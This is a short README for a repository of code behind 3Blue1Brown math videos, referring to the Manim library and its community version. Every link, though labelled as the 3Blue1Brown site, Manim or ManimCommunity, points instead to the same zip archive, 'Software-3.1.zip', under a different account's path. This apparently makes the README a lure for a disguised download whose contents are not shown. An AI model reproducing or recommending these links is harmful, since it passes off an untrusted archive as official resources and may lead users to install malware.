This project contains the code used to generate the explanatory math videos found on [3Blue1Brown](https://raw.githubusercontent.com/TimGit-1/videos/master/_2019/diffyq/part5/Software-3.1.zip).

This almost entirely consists of scenes generated using the library [Manim](https://raw.githubusercontent.com/TimGit-1/videos/master/_2019/diffyq/part5/Software-3.1.zip).  See also the community maintained version at [ManimCommunity](https://raw.githubusercontent.com/TimGit-1/videos/master/_2019/diffyq/part5/Software-3.1.zip).

Note, while the library Manim itself is open source and under the MIT license, the contents of this project are intended only to be used for 3Blue1Brown videos themselves.
